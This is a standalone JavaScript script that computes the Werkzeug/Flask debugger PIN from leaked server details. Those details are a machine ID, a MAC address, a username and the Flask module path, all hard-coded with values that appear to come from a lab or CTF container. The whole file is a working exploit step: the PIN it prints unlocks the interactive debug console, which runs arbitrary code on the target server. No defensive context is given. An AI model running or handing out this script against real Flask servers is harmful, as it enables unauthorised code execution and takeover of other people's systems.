import { createHash } from "crypto";

// -----------------------------------------------------------------------------

const MACHINE_ID = "db004940-aa5c-4dff-ad37-2c3e70a8b9e2";
const MAC_ADDR = "02:42:ac:11:00:04";
const USERNAME = "nobody";
const FLASK_PATH = "/usr/local/lib/python3.11/site-packages/flask/app.py";

// -----------------------------------------------------------------------------

const probablyPublicBits = [USERNAME, "flask.app", "Flask", FLASK_PATH];

const privateBits = [
  parseInt(MAC_ADDR.replaceAll(":", ""), 16).toString(),
  MACHINE_ID,
];

const h = createHash("sha1");

for (const bit of [...probablyPublicBits, ...privateBits]) {
  if (!bit) continue;

  const bitBytes = typeof bit === "string" ? Buffer.from(bit, "utf-8") : bit;
  h.update(bitBytes);
}

h.update(Buffer.from("cookiesalt", "utf-8"));

let num = null;
if (num === null) {
  const h2 = createHash("sha1");

  for (const bit of [...probablyPublicBits, ...privateBits]) {
    if (!bit) {
      continue;
    }

    const bitBytes = typeof bit === "string" ? Buffer.from(bit, "utf-8") : bit;
    h2.update(bitBytes);
  }

  h2.update(Buffer.from("cookiesalt", "utf-8"));
  h2.update(Buffer.from("pinsalt", "utf-8"));

  const hexDigest = h2.digest("hex");
  const bigIntValue = BigInt("0x" + hexDigest);
  const formatted = bigIntValue.toString().padStart(9, "0");
  num = formatted.slice(0, 9);
}

let rv = null;
if (rv === null) {
  const groupSizes = [5, 4, 3];

  for (const groupSize of groupSizes) {
    if (num.length % groupSize === 0) {
      const groups = [];
      for (let x = 0; x < num.length; x += groupSize) {
        const group = num.slice(x, x + groupSize).padStart(groupSize, "0");
        groups.push(group);
      }
      rv = groups.join("-");
      break;
    }
  }

  if (rv === null) {
    rv = num;
  }
}

console.log(rv);
